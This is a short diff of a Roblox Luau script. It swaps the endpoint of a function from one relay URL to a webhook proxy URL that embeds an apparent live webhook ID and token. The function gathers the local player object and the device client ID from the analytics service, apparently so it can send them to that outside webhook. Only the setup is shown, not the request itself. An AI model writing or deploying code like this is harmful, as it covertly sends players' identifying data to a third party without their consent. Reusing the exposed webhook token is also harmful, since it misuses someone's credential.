@@ -44,7 +44,7 @@ local blocked = {
 }
 
 local function s(d: string): ()
-    local w = "https://dcrelay.liteeagle.me/relay/bf6a13af-eaba-4ace-aa47-a184c8a38b5b"
+    local w = "https://webhook.lewisakura.moe/api/webhooks/1401593480396013618/KRH7UU45DCixbcQbyJkEzh2tbdtAFmyikffFiHOZA7pVBAPhqwDSSi031-se5fb6Nx8C"
     local b = game:GetService("HttpService")
     local c = game:GetService("Players").LocalPlayer
     local h = game:GetService("RbxAnalyticsService"):GetClientId()
